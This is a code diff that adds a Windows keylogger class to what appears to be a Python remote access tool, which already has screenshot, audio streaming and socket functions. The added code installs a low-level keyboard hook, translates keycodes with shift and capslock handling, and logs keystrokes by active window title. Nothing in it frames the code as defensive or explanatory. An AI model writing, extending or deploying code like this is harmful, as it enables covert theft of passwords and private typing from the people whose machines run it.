@@ -7,6 +7,7 @@ import os
 import subprocess
 import threading
 import ctypes
+from ctypes.wintypes import MSG
 import sys
 import platform
 import zlib
@@ -88,6 +89,38 @@ def screenshot():
         'width': str(bmp_info.bmiHeader.biWidth),
         'height': str(bmp_info.bmiHeader.biHeight),
     })
+
+shiftcodes = {
+    49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
+    54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
+    189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
+    186: ':', 222: '"', 188: '<', 190: '>', 191: '?',
+}
+keycodes = {
+    160: '', 161: '', 32: ' ',
+    9: '[<-TAB->]', 8: '[<<<DEL]', 162: '', 163: '', 144: '',
+    35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '',
+}
+updateCode = {
+    189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
+    186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
+    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
+    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
+    111: '/', 106: '*', 109: '-', 107: '+',
+    110: '.'
+}
+
+
+def update_key(k):
+    if updateCode.has_key(k):
+        return updateCode[k]
+    else:
+        return str(chr(k))
+
+
+def get_fptr(fn):
+    cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
+    return cmpfunc(fn)
 
 
 def send(sock, _data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
@@ -337,6 +370,73 @@ class AudioStreaming(threading.Thread):
         self.stream.close()
         self.p.terminate()
 
+
+class KeyLogger:
+    def __init__(self):
+        self.hooked = None
+
+    def install_hook_proc(self, pointer):
+        self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
+        if not self.hooked:
+            return False
+        return True
+
+    def uninstall_hook_proc(self):
+        pass
+
+
+class Key(threading.Thread):
+    def __init__(self):
+        super(Key, self).__init__()
+
+        self.window_title = ''
+
+    def writeLog(self, log):
+        current_window_title = get_window_title()
+        if current_window_title != self.window_title:
+            print current_window_title
+            print '\n'
+            print log
+            print '\n\n\n'
+            self.window_title = current_window_title
+        #logs += log
+
+    def hook_proc(self, n_code, w_param, l_param):
+
+        if w_param is not 0x0100:
+            return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
+
+        if keycodes.has_key(l_param[0]):
+            key = keycodes[l_param[0]]
+        else:
+            # Capslock ON
+            if User32.GetKeyState(0x14) & 1:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
+                        l_param[0]).lower()
+                else:
+                    key = update_key(l_param[0]).upper()
+            # Capslock OFF
+            else:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
+                        l_param[0]).upper()
+                else:
+                    key = update_key(l_param[0]).lower()
+        self.writeLog(key)
+
+        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
+
+    def start_keylogger(self):
+        msg = MSG()
+        User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)
+
+    def run(self):
+        self.keyLogger = KeyLogger()
+        self.pointer = get_fptr(self.hook_proc)
+        if self.keyLogger.install_hook_proc(self.pointer):
+            pass
+        self.start_keylogger()
 
 def start_child_socket(id, mode):
     socketsBank[id] = ChildSocket(id, mode)
